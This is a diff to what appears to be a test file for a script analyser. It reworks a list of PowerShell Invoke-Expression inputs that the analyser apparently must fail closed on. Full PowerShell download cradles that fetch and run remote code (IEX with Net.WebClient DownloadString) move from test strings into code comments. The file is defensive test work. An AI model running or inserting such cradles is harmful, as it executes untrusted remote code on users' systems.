@@ -43,11 +43,13 @@ def extract(dialect, script):
         "Invoke-Expression $x",
         "Invoke-Expression -Command $x",
         "iex 'Get-Process'",
+        # The short forms exercise the same fail-closed eval-head branch as
+        # these realistic download cradles:
+        # IEX(New-Object Net.WebClient).DownloadString('http://x')
+        # Invoke-Expression(New-Object Net.WebClient).DownloadString('http://x')
         "IEX(New-Object).DownloadString",
-        "IEX(New-Object Net.WebClient).DownloadString('http://x')",
         "iex(New-Object).DownloadString",
         "Invoke-Expression(New-Object).DownloadString",
-        "Invoke-Expression(New-Object Net.WebClient).DownloadString('http://x')",
         "Invoke-Command -ScriptBlock $sb",
         "Start-Job -ScriptBlock $sb",
     ],
